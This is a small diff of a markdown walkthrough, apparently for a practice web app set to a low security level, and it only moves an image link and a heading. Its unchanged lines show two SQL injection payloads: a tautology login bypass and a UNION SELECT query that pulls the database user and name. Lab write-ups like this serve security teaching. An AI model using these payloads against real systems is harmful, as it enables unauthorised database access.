@@ -72,12 +72,11 @@ Change Security level to Low
 Inject SQL 
 ' OR '1'='1
 
-Payload for extracting data
+
 <img width="1470" alt="data extraction" src="https://github.com/user-attachments/assets/9227ab86-e022-4b6a-b13c-15cbac6b6c87" />
-
-
+Payload for extracting data
 Payload' UNION SELECT user(), database()
-<img width="1470" alt="image" src="https://github.com/user-attachments/assets/876f31cd-1f4e-4dc6-ac86-b8ed7df5fc73" />
+
 
 
 
